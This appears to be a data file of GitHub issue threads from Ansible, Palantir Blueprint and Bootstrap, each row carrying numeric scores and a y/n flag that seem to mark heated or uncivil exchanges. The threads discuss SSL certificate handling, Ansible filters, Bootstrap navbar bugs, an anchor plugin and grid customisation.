ansible/ansible/17811,0.07185866,ansible,ansible,Allow vmware_inventory to control acceptance of SSL certificates,602,3,2,0,0,"ISSUE TYPE  Bug Report  COMPONENT NAME vmware_inventory ANSIBLE VERSION CONFIGURATION OS / ENVIRONMENT SUMMARY ‚ô†vmware_inventory` blindly accepts the SSL certificate at the moment - regardless of it being part of a genuine chain or a self signed cert. Convenient, possibly, but not the height of security. Really we should have an option to accept a certificate or not so people can decide their attitude to risk. STEPS TO REPRODUCE EXPECTED RESULTS Reject or accept connecting to vsphere over SSL based on an option. ACTUAL RESULTS Inventory script always connects, no matter what the certificate is. ",2,0,13,0,0,125,0,n,
ansible/ansible/46215,0.138540974,ansible,ansible,Add a version of the combine-filter that merges in reversed order,3804,45,70,0,0,"SUMMARY I'd like to be able to use the combine-filter but merge in reverse order. ISSUE TYPE  Feature Idea  COMPONENT NAME No idea ADDITIONAL INFORMATION One common pattern that I return to when constructing Ansible roles is to have some variables for the role described (with defaults) in  and then apply some defaults or transformations to that data inside  (prefixing the variable with  to make it clear that the variable is internal and manipulated). Example defaults/main.yml vars/main.yml This allows me to define my variables in my inventory like this inventory/development/group_vars/database/vars.yml ‚Ä¶while not having to put lots of -filters in my task files. Now to my problem. See the  definition above. If I could reverse the merge-order of combine I could define it like this instead vars/main.yml Which reads a lot nicer. I use the above approach when I want to override something in a list of objects (which comes up more seldomly) yaml _db_user_overrides   admin false _db_users &gt;-   {{ db_users | map('combine', _db_user_overrides) | list }} ‚ô† Solution(?) Either a -filter or a new key to the -filter would do. Maybe  or  (as in left-to-right merge).  Files identified in the description  lib/ansible/inventory lib/ansible/modules/files/file.py lib/ansible/modules/packaging/os/apt.py lib/ansible/parsing/utils/yaml.py lib/ansible/playbook/role test/integration/targets/apt/defaults/main.yml test/integration/targets/binary/vars/main.yml  If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help   cc @friend click here for bot help   soo, why not just switch the variables? is the same as your example w/o requiring a new keyword  Is it though?  is a dict and not a list. Not sure what applying the  filter on a dict would do.  @friend Here's a test of your suggestion combine.yml  If there was a -filter that took input and produced a stream of  copies of it I could do something like this The replicate filter would work like this So that's another solution to my problem. /Mattias ‚Äî who's aware that he's very focused on his particular problem right now ;)  I'll try to implement this as a filter-plugin in my local repository and see if I can get it all to work. Would you be interested in a PR then later?  Added a PR for this.  combine takes N dictionaries, all terms need to be dicts, it should not work if any is a list no matter the order. The issue here is your use of map more than the issue with the combine filter itself  Well... Also the code was based on your suggestion. No it's not. One might add support for my use case by extending  instead of , but there really isn't an issue with my use of map. I'm not trying to split hairs here. Rather I'm trying to communicate an issue with the way you communicate. It really is unnecessarily provocative. Please try to drop the attitude.  sorry, i might have phrased that better, its not that you are using map incorrectly, its that you are using map at all that is the issue here. This is a limitation of map, not combine.  Thanks! All good üòä ‚ù§Ô∏è I agree with your premise and I'll continue the discussion in the PR. I have some other ideas that might be helpful as well!  Files identified in the description None If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help   I found a hacky solution for this use case First, combine each dict with the defaults (override with defaults). Then, zip these n ""defaults"" with each dict and finally map these tuples of dicts using combine. Example This is how you create a new users dict, with defaults applied  I've done lots of those. ‚ô• Eventually started writing my own filters that I put together with my playbooks. Mmmm, I love this! üòÇ‚ô• ",15,14,164,0,0,120,7,n,
blueprint/palantir/2875,0.56854236,palantir,blueprint,Stop using my tools,279,5,3,0.545454545,0,"Apologies to any contributors who aren't employees of Palantir. But to those that are Please find jobs elsewhere and stop helping Palantir do horrible things. Also, stop using my tools (such as Lerna), I don't support you, and I don't want my work to benefit your awful company. ",0,0,11,0.272727273,0.090909091,9,0,y,
bootstrap/twbs/11243,0.066109687,twbs,bootstrap,Navbar issues,12612,204,106,0,4,"The default navbar ( act a little bit weird when  I click dropdown (keep it opened) and then resize the browser until the navbar-toggle button appear, click it, open the dropdown and then maximize the browser. after those step, I can't open the dropdown on navbar default state..  What browser are you using? Everything works well on Chrome.  I'm using Google chrome. On my previous bootstrap 3 files, everything works fine, Until I sync it today and replace it (both unminified css &amp; js file). I'm glad I have a backup bootstrap files )  This issue exists for us as well. Same browser.  I think that found the thing causing the bug. No one of browsers can works in all test cases, but this is due to the viewport (dropdown forgets the place where should appear). @friend Please, don't try to kill your browser. This test case is too aggressive.  I've got a trick to avoid the bug appearing when we maximize the browser. default bootstrap markup  the bug appear when we maximize the browser and we have  I've tried to change  class to . and it's works. bootstrap navbar is back to normal. in the end, we would have this markup when our browser is maximized  anyway, this is just a trick. my javascript skill is not yet able to fix this.. ( you can use  for resize event or anything else to manipulate the markup. hope this can solve our problem )  we have the same issue on our site and fixed it by closing the collapse dropdown after resizing the browser through adding this javascript code we also use a good plugin for resizestop event  Or try to add  When I add @friend (min-width 768px)  {  .navbar-collapse.in{ overflow-yvisible;} } ""navbar-right"" or ""pull-right"" doesn't work anymore. The solution of Nugrata works fine  @friend This problem happens for me using the latest Google Chrome. The finer points of this bug are not about the original navbar drop down but the collapsed navbar drop down. If that is up when you re enlarge the window it's fine. The bug only occurs after clicking on the little three lined icon if you then re enlarge the window while the revealed stacked navbar is still down.  Is this now the definitive thread and is there a definitive answer?  Again, sorry @friend. This is an issue about Chrome's viewport resize, and things like this happens on many sites, undependent of framework (like Bootstrap). So, I think that this issue can be closed. How to fix it? Don't play games with your browser's viewport.  @friend I disagree. If I write my website using the bootstrap system and any visitor of my site has a good reason to shrink the window for a while and later regrow the window they have a right to be alarmed and not accused of playing games with their viewport. It is a bug, and even though there may be workarounds, although it's not clear to me what the definitive workaround is, it's not fixed until it's fixed to everyone's satisfaction in a future version of bootstrap.  @friend That's all about viewport. You should report bug in Chrome bug tracker. ;)  I think we have a misunderstanding here. The bug I'm referring to is the one I described in the thread that has been closed because it was assumed to be the same a this one. That bug happens exactly the same in Safari, Firefox and Chrome. It is not just a Chrome issue. It is more likely a bootstrap issue. Try the link above to issue #11603 and read my description of the issue. If these issues are at cross purposes perhaps we need to separate them. I originally assumed when it was pointed to me that my issue was a duplicate and that this issue was the same hence why am commenting here now. I think this is definitely a bug in bootstrap and not just a browser issue given that three distinct browsers repeat the same behaviour.  I'm not going to close this issue.  @friend I don't know, but it looks like viewport issue (happens when resize window). I know that it can be fixed, but I don't think it's issue directly within Bootstrap.  @friend I didn't think you were going to close this thread. I was referring to the closure of #11603. @friend If you can show me a solution that you think works I'll try it out and see.  i don't have complete solution. I'm just avoiding window resizing games. smile  @friend I'm not finding your suggested solution that clear. I'm new to bootstrap. Would you mind perhaps expanding on what exactly to do and where in order to fix this problem. Right now I can't see the forest for the trees.  @friend It's not about what we're doing. We can't avoid what our web site clients are going to do. They are the ones who will get annoyed with our web sites and that's what concerns me. We can't in all seriousness post a directive on our home pages for users to not play silly whatsits with their windows.  I added  as a possible solution. But @friend mentioned this will break ""navbar-right"" and / or ""pull-right"".  What I thought is our problem come when we enlarge our browser but the  class within  is messing the navbar. so that  class got my attention. let's take a look the css file for a while.. I've found some  class related to our problem remembering that we have a trick to change  class to  and it works for me, so i'm interested with @friend (min-width 768px) block rules. Since the  class is our savior, I copied the rules and paste it on  rules. The result's look like this.. With this trick, the default Navbar is working perfectly when we enlarge our browser but we'll get a dropdown opened. I think that's not a big deal since our navbar is back to normal. Hope this trick can solve the problem once again. Please make sure you backed up your file first before trying this trick or you can use another css file to override the rules..  Everyone concerned about this should get a group of non-developer friends and do not tell them anything is ""wrong"" and see if they discover this. No regular user does this. If a user wants a window out of the way they click minimize. Most users slightly size down pages but if they do, they're not likely to size it down to see the mobile menu then click the toggle in the menu, pause and not click a link in the menu, but instead decide to re-size their page back up again. If it happens between flipping orientations, that's where the problem arises. That is a natural thing to do, even by accident, to click something in a menu, and then flip the device to landscape.  Yup, that's it. 2013/11/25 carasmo notifications@friend.com --  Zlatan Vasoviƒá - ZDroid  @friend Thanks. This works for me. I haven't noticed any side effects as yet, have you? An easy confusion in talking about this is that the navbar has a drop down menu in it. Then, when you shrink the window, the navbar itself becomes a drop down. You don't have to drop the drop down inside the dropped down navbar for this problem to happen. If you do, when you re enlarge the scroll bar is there already. With your fix, if you drop the inside drop down while in a shrunken window, it's still dropped when you re enlarge. I don't think that's a problem. If you were looking at it in the shrunken window, it's not a surprise when you re enlarge. I'm very happy with this now. I hope the developers will be too and that there are no side effects.  @friend I disagree. I don't think you should make too many assumptions about ""regular"" users. It's clearly a bug and as such should be fixed, just in case. Let's say you're copying information from one window into another open app where a simple cut and paste is not an option and want these two views side by side. Sometimes shrinking both windows is the only option. And even if the majority of examples where a user was doing something like that might be able to be done another way without shrinking windows - we can't go around and reeducate them on an individual basis. And most people that get upset about stuff like that, don't complain and just go away. I don't want that happening on my web sites.  If only we could make open source projects from a user-centered design perspective.  Won't change my mind. Shrinking both menus side by side and then copying pasting are different than deciding to toggle a menu and not click a link in that menu but then decide to just resize the page. Most people will refresh their browser if they happened to do that and discover that things have gone wonky. Hopefully this responsive crap will go away and all media queries will be min-device-width. I've done small menus where it doesn't even kick in unless that user comes to that site at the break point, not a single client says anything because the check their phone, works fine, check their desktop and tablet and it works fine. Just tell 'em it's adaptive, not responsive and move on.  If you feel that way about responsive design why are you contributing to a responsive framework?  I think I am misunderstanding what the purpose of participating in the project is.  I thought it was to help build a better bootstrap, but after a day of auditing these issues it seems like it is more about reddit style bickering over opinions that really aren't germane to the issues.  @friend Exactly. You've cut straight to the chase.  BS3 has the BEST grid system ever and the author's are geniuses. That is why. This stuff that regular users will not discover is simply not something that's important at all and after a month of seeing this thread, I just had to say something. I agree with the the test case being too aggressive. It's illogical. If it were a big deal or even a bug IMO, this thread would have more than 9 followers with 2 of them being team members. There would be a lot of plus ones.  Man I really don't get it.  I think I'll choose another project to contribute to.  It is indeed an edge case, but one that seems fixable and one that IMHO ought to get fixed.  @friend Why would you do that in response to one individual's opinion? The project itself is a worthy one. @friend I've been supporting various levels of computer user in a variety of contexts over many years and your supposition that a regular user wouldn't stumble on this flaw is just plain wrong. Many regular computer users get very quickly frustrated when software doesn't work as expected and generally being non technical, use software in ways that technical creators often won't appreciate. I may not be a regular user but I only just discovered bootstrap yesterday and this bug came up within a very short time of using it, I was simply checking that it was doing what it claimed to be doing. @friend I agree it's not a major bug but I, like Stephen did not expect to find myself having this discussion here.  I picked 20 issues and read through the threads, started doing research to come up with my first fork.  I'm seeing this attitude across this entire repo.  I really, really like bootstrap and want to contribute, but maybe the popular repos are attracting the wrong crowd?  I don't know, I'm new to this so I think I'll be safer with a smaller project for my first go.  Out of curiosity are @friend and @friend contributors? There have been quite a few people interested in this issue. An initial problem was that this interest was spread out over 5 duplicated issues.  Yes, I'm on the core team  has submitted a number of pull requests and legitimate bug reports.  Firstly, I should mention that the OP issue occurs in both static and fixed navbars. A related issue that I'm not yet clear about is that the fixed navbar in collapsed form does not push content down when you drop it. Is that intended? Is it too hard to do otherwise because of its fixed state? Ideally I would like a top of the window navbar that stays fixed and visible at the top but pushes content down when you drop it in its collapsed state.  @friend Intended AFAIK. I think it's just the design choice that was made. I don't know if the alternative you're proposing was ever considered.  I found a reason of bug. When you open a dropdown, resize window, uncollapse navbar, open dropdown and resize window again you'll get a  on . When remove that dummy  attribute you'll be able to see dropdown, again.  I have spent many hours trying to figure out what is happening here, and I'm not on the core team, so it is definitely not a completely obscure thing that is unlikely to happen to real people. Hope it gets fixed in a future release.  @friend If I found a real way to implement this fix, I'll send a pull request. )  Thank you @friend. I got a workaround on StackOverflow (with link to this thread), but I wish I did not have to spend so many hours trying to figure out what was going on. Hope it will help others, too.  Closing for #11653. ",47,16,405,0,0,221,10,y,
bootstrap/twbs/16248,0.36949757,twbs,bootstrap,Bootstrap Anchor plugin,17929,252,203,0,4,"Hello all. I'd first like to preface this with a little about myself. I am the primary maintainer for the Drupal Bootstrap base-theme. It currently has over 60k installs, so needless to say we get a lot of our own issues. Recently, I started the task of trying to tackle better anchor and scrolling support in the base-theme. Support for anchors or scrolling to them has always been a big pain, for not only me, but also a lot of others; especially when dealing with fixed navbars [jsbin]. The code I currently have in the project was rather hack-ish and completely un-configurable (my feeble attempt to satisfy a growing issue), so I set out to tackle this once and for all [ I've poured over countless blogs, docs, support forums and even found a few in this project's issue queue [#193, #1768, #11854]. The ""solutions"" vary from CSS to JS, but more often than not require at least some sort of manual configuration for it to work with that specific theme/offset requirement. Ultimately though, I've determined that a CSS-only solution just doesn't really cut it; especially when dealing with dynamic and varying content as such in CMS framework like Drupal. So, I've created the following JS based plugin instead  [demo/docs] In an effort to offset the ""cost"" for using JS, I was also inspired with the recent addition using anchor.js for Bootstrap's own documentation (#14897, #15491). This got me to thinking how this could easily be expanded from Bootstrap's own Tooltip plugin, like Popovers are. What makes it even more enticing is that there has been a  available to use for quite a while. Since both Tooltips and Popovers are completely opt-in with no data API support, it made sense to follow in that direction; especially for those who still want/need a CSS-only solution. My ultimate goal/desire is to merge this upstream into Bootstrap directly. I'm sure this will be a daunting task which is why I'm creating this issue now to get some feedback and eyes on this plugin so it can be flushed out a bit more. I'm still working on documentation of all the new options, so bare that in mind. I look forward to y'alls feedback!  Hi @friend! You appear to have posted a live example ( which is always a good first step. However, according to the HTML5 validator, your example has some validation errors, which might potentially be causing your issue  line 99, column 23 A  meta ‚ô†` element found after the first 512 bytes.  You'll need to fix these errors and post a revised example before we can proceed further. Thanks! (Please note that this is a fully automated comment.)  I personally doubt the Core Team would be interested in getting into the same business as Anchor.js when Anchor.js itself already does a fine job. As for #1768 &amp; friends, you might have more traction on that front, although we're fairly reluctant to add more jQuery plugins at this point. I too wish there was a good solution to that bug though.  Except that Anchor.js isn't bundled with Bootstrap. This is about providing and out-of-the-box native Bootstrap plugin... not relying on yet another 3rd party external library that people will have to download, install and configure in addition to. That's certainly debatable. It's lightweight and works well for simple sites, sure, but also at the cost of being easily configurable in case complexities arise. It doesn't use a template for inserting existing markup that a framework (like Bootstrap) already has available and the only way to replace the ""icon"" is to override/replace the CSS it provides. It's ID generation logic could also use some work. I'm really not trying to knock it, in fact it was in part responsible for the discovery process that led to this plugin. It certainly has it's use cases, but I wouldn't have built what I did if it did a ""good"" enough job. I would like to make it clear that this plugin is a pure extension on top of the existing Bootstrap tooltip plugin. It is and was not an Anchor.js rip-off, just inspired by it as well as Bootstrap's existing Tooltip plugin. I think you're missing the point of the plugin. It's goal is to really tie two concepts together anchors and links to anchors (anchor links). By doing so, they're aware of each other and can work together in harmony to provide a more cohesive anchor/scrolling solution. Sure. I'm not suggesting that this should be in the next release. It's currently not, by any means, ""production"" ready. In fact, I imagined that it would be BS4 in all reality (with the separate repo for BS3 support/prototyping). Like I said above, I opened this issue for exposure and to get viable feedback. I was hoping to have more of a positive feedback and to move forward rather than defending a solution to a problem that has been quite evident for quite some time now. I'm certainly open to suggestions, improvements and even changing some fundamental aspects about the plugin, it's not set in stone. I urge people to seriously consider this proposal rather than simply dismissing it outright because of ""simpler"" existing plugins.  Just speaking generally There is a limit to what we can bundle, both due to the amount of effort required (e.g. I'm doubtful that Bootstrap itself will ever include a datepicker; they're just too damn complex and we already have our work cut out for us just maintaining the existing widgets) and due to fears of bloat (which we're already occasionally accused of with just our current set of widgets). And the trend these days is towards smaller modular packages rather than kitchen sinks. Actually, one of the hopes for Bootstrap v3 was to strengthen the third-party plugin ecosystem and thus lessen the pressure for new plugins in core Bootstrap, but unfortunately not much happened on that front. Anyway, I'll be interested to see what the rest of the team says about the proposal.  I'm rather curious as to the hesitation. Have you even looked at the code and demo yet? I've already done most of the ground work...  agree, but this isn't about just adding a arbitrary feature, it's also a solution to an issue that this framework introduces in the first place by providing a fixed navbar. It's kind of like saying ""Here's a nifty feature for navigation, but don't mind that your anchors may behave a bit oddly at times. Will we fix it, no... there's a few hacks around the interwebs, do some research."" I will gladly accept sole responsibility for maintaining this specific plugin it if it were ever to come to that. Somehow though, I doubt that will happen considering it's already built upon and in the same format as the Tooltip plugin. Yes, I would be too.  @friend A few things It's interesting to me that you get a lot of requests for the feature in your Drupal theme. Forgive me, but it's been quite some time since I touched PHP or any CMS but is that a common sort of feature in Drupal themes? I haven't seen it come up too often in Bootstrap's IRC channel or elsewhere, so it's interesting to me that it'd be a requested feature elsewhere. I'd also be interested if it's the sort of plugin other theme developers might want to use. Secondly, this is a bit unfair The docs note that using fixed navbars requires some padding adjustments. While that doesn't cover every combination of components and HTML on a page (a fixed navbar and anchors to IDs in this specific instance). Solving that problem is usually done simply with an offset on the click. Bootstrap-anchor does much more than solve that one issue, though, which brings me to my third thing. Adding features, especially full-fledged plugins, need to be evaluated in terms of long-term maintenance costs (it's great that you're offering to support it, but it's also no guarantee, unfortunately), added complexity (you'll be surprised by how authors use Bootstrap in unexpected ways) and package costs (like @friend pointed out, Bootstrap already gets flack for being heavy in many ways). Anyway, I'm not saying -1 yet but I'm not sold yet on why this should be a core plugin and not a community plugin.  I wouldn't say it's ""common"" per se, but it certainly more of a prevalent issue when Drupal modules like the Administration Menu add their own fixed nav and increases the  margin (not padding) on top of a user who has opted to use the Bootstrap fixed navbar that adds  padding; it can get rather complicated and nasty very quickly. I think that's because people who are in the business of starting with Bootstrap directly (i.e. reading the docs, in the IRC channel) are generally themers/site builders or at the very least able to understand that there will be a minimal amount of effort in configuring their ""theme"". The Drupal Bootstrap base-theme's sole purpose is to bridge that gap between the dynamic aspect of Drupal and the Bootstrap framework. One of the main reasons this base-theme has risen to become very popular (currently third top Drupal theme) in such a short amount of time is because it allows non-themers to configure their Bootstrap theme in an easy to use administrative UI. I understand that I come from a unique perspective and it's partially a unique issue to us. Users choose Drupal Bootstrap because the framework is popular. The don't always choose it because they know the little intricacies/issues that come with choosing their fixed navbar type from the UI  These types of users are not always skilled CSS/JS ninjas, so when they see that there's an issue with their anchor's ""Solving that problem is usually done simply with an offset on the click"" is really not always as ""simple"" as it sounds. Which is why I've been working on a way to assist with/fix this problem. Yes, I understand and acknowledged this fact up front as one of the reasons for offsetting the ""cost"" of using a JS based solution to the scrolling issue by expanding upon Bootstrap's Tooltip plugin with anchor links. Also, again, it goes further than just ""adding in another feature"" really. The two work in together in harmony. By building the plugin with the concept of ""anchors"" and ""anchor links"", it allows for a more cohesive UX in addressing ""What happens when I click an anchor on this page?"". I do find it a little ironic though that even the docs suddenly had a need for them, but there wasn't anything native in Bootstrap to do it so a third party plugin was used instead. I really do understand all of this and agree with it, believe me, I do. I'm not suggesting this plugin is just thrown in willy nilly without any sort of evaluation, game plan or what have you. I think the real purpose of why I opened this issue in the first place is really being lost here. I'm not saying it can't be either. I opened this issue to get evaluation and feedback on the plugin itself, not quarrel over semantics. Yes, I said it was my goal/desire to ultimately make this a core plugin, but who knows, maybe that won't be the case and I'll just keep it as a separate contrib plugin. That is certainly fine by me. All I was looking for really was ""Wow that's cool... let's work on making it better! Maybe it's something that does have merit to pull into core.""... you know FOSS, not getting smacked down for having an idea on how to fix a very real issue. I'm honestly half tempted to just close this issue and just continue developing it as a contrib plugin if this is going to be the attitude moving forward frowning  Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve‚Äîlinking to specific sections of content‚Äîquite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars‚Äîdamned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3  Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve‚Äîlinking to specific sections of content‚Äîquite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars‚Äîdamned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3 ",65,24,630,0,0,364,7,n,
bootstrap/twbs/16338,0.067857169,twbs,bootstrap,"Chrome userAgent styles for input[type=""date""] etc change display style to inline-flex",521,6,6,0,1,"I'm not familiar with this repository, and I can't ascertain the bootstrap attitude toward userAgent styles. Regardless, Chrome OSX 42.0.2311.90 changes the  style of html5 time elements. Is this something bootstrap should rein in or is it a  fix?  Probably don't need to do much here since we override much of those styles with  anyway. Thanks for the heads up though!  Interesting note Their  can't be totally overridden; their calculated  is always some kind of flex. Setting  just makes it compute to  (instead of ). ",3,0,19,0,0,14,2,n,
bootstrap/twbs/19814,0.10431067,twbs,bootstrap,What happened to the navigation for smartphones?,786,9,5,0,1,"I began to migrate to the Bootstrap 4. All components are successfully updated, except for navigation. How does the navigation Bootstrap 3 for smartphones image How does the navigation Bootstrap 4 for smartphones image1 or image2 What caused such an attitude to navigation?  There is a large amount of work to be done on navs still... Alpha2 is not production ready so you'll have to live with issues as v4 matures  Well, I hope that this defect will be fixed.  @friend It's not a defect, it's a WIP. Please close this issue since it is a duplicate of  As @friend said, v4 is still in early alpha, and a lot of structures, styles and scripts have changed considerably/aren't finished yet - migrating to v4 already at this stage will likely bring up issues. And yes, duplicate of #17250 ",3,0,25,0,0,19,1,n,
bootstrap/twbs/7050,0.067280693,twbs,bootstrap,"Popovers in 2.3.0, why would title text display but not the body text",1856,21,33,0,1,"Have tried the following and a couple of other iterations.  I have jquery.js (full being brought in.  Assume I don't need bootstrap-tooltips.js AND bootstrap-popover.js as well?  Regardless, the problem isn't solved when including them.  TIA.             &lt;a data-toggle=""popover"" class=""m-btn blue rnd"" data-title= ""We are in  awwwwww"" data-content=""dolor sit amet.""&gt;Click me!&lt;/a&gt;             &lt;script type=""text/javascript""&gt;                 $(function () {                     $('body').popover({                         selector 'a[rel=""popover""], [data-toggle=""popover""]'                     });                      $('body').tooltip({                         selector 'a[rel=""tooltip""], [data-toggle=""tooltip""]'                     });                 });             &lt;/script&gt;   This doesn't seem to be the right forum for this ? although issue is valid.  Moving to mailing list since patience wears thin on noob questions apparently.  this could be happening cause the tooltip / popover is in a btn-group or one of the input-append or input-prepend classes.. we can set a container option to help fix that problem.. `  Duplicate of #5930.  Thanks.  That was fixed in 2.3 (I found) and when i got jquery link code cleaned up a bit.  Now I just wrestling with keeping the popover open long enough to read and click on embedded hyperlinks within before manually shutting it down.  Best, V. On Thu, Mar 14, 2013 at 1236 PM, Chris Rebert notifications@friend.comwrote --  Vince Fulco, CFA, CAIA 612.424.5477 (universal) vfulco1@friend.com twitter vfulco app.net vfulco -- ‚ÄúEverything can be taken from a man but one thing the last of the human freedoms ‚Äì to choose one‚Äôs attitude in any given set of circumstances, to choose one‚Äôs own way‚Äù.  --Viktor Frankel Always have your stuff when you need it with @friend. Sign up for free! ",3,6,160,0,0,44,4,n,
bootstrap/twbs/7745,0.362808789,twbs,bootstrap,customize bootstrap results in 1 potentially wrong variable in media query,7842,81,121,0,0,"I was looking at the media query for (max-width 767px) in my custom bootstrap downloaded from the site, and I believe it has an error in it. I customized my bootstrap using the online customization to have 15 columns, which worked out great. Yet I believe this code is incorrect and should be referencing span15 in my case, or the largest span# in any custom bootstrap.css .span12, .row-fluid .span12 {     width 100%;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;   } Let me know if my assumption is true, as I don't immediately detect any difference in my layout by changing the 12 to 15.  If you post code on github use the appropriate markdown. Link is on the top right of the comment box. I am not working with 2.0 anymore but i can confirm this code is in the generated CSS I just downloaded to to look at. This should indeed output as  based on the custom span value used. I used 16 as a custom value everything else is generated as it should be but this part is fixed to 12 is seems. If the assumption is true this means if you use  this will break your layout. Like . span15 should also not have the optimal layout but there are very few cases people use the maximum span inside a row I guess since there is not really a point, that maybe for dynamic content. But if you use spans inside rows you should definitely see changes when your switch from 12 to 15. You should now have the space of 3 spans empty at the right of your rows.  I'm not sure what you're talking about with regard to proper markdown. It looks fine and readable to me...? I don't have any span 12s on my pages, but I bet you're right! I bet if I did, I'd be wondering why my layout is broken. Concerning your last paragraph, that's true. But what I'm saying is that changing .span12, .row-fluid .span12 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } to .span15, .row-fluid .span15 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } doesn't appear to do anything to my layout at sizes less than 767px. I don't see a difference at least. Should I?  Closing this out‚Äîthe grid system is massively overhauled in v3 and everything does get .  @friend well your code is not indented what is probably caused by just copy pasting it and its not in monospace font so you not used the markdown for it. For this short parts of code not so big deal but you should just use it when posting on github. Look I think it's a bit harsh to just close it since it is a actual bug you discovered. The bug should be easy to find and fix. But on the other hand makes sense since in 3.0 things are handled so much better. And no once the spans are not floating you should not see a difference. So you do actually see one when 768+, thats what I meant. I suggest you dig a bit into it and learn what the grid actually does. You may dig down the source of this bug on the way. Or simply not use span12 and span15 in your case and you're good. I personally would only use even numbers for the grid btw since you can't 50/50 otherwise.  Thanks for the extra reply nextgenthemes! I was hoping you'd answer my question. ) For my client's website, the majority of their columns in the design I made are 3 and 5 column, and you can't do 5 centered columns in an even numbered grid that also can do 3 columns. You can only do 5 column in these grid column amounts 5, 10, 15, 20, and so on. You can do 3 column layouts in these column amounts 3, 6, 9, 12, 15, 18, 21. 15 was the best way for me, and the design has been working beautifully (and easily) ever since I switched to a custom 15 column grid. I'm glad the customize section of Bootstrap exists, otherwise I never would have been able to do all of the math, however, I must admit the math for the column and gutter sizes did take me a few hours of trial and error. If what I said above doesn't make sense to anybody who ends up reading this via a google search someday... The reason I used a 15 column grid is because... span5, span5, span5 = 3 column layout span 3, span 3, span 3, span 3, span 3 = 5 column layout What nextgenthemes says about not being able to do 50/50 using supplied CSS classes is true, however that is extremely easy to write custom CSS for. In fact, I am using custom CSS to do exactly that for something that I want to go from span5, span10 to 50/50 on screen sizes smaller than 767px (by default all spans collapse into 1 column at this size). Maybe this will help someone some day, so I'll go through the process. What I did was replace my span5 and span10 with spain5nocollapse and spain10nocollapse in the HTML file, then put this code into my custom CSS. /note you'll need to open your bootstrap-responsive or custom bootstrap.css and find the appropriate percentages for your site/ .row-fluid .spain10nocollapse {     width 65.29284164859001%; /see note above/     width 65.23861171366593%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 30.585683297180044%; /see note above/     width 30.531453362255967%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } @friend (max-width 767px) { .row-fluid .spain10nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     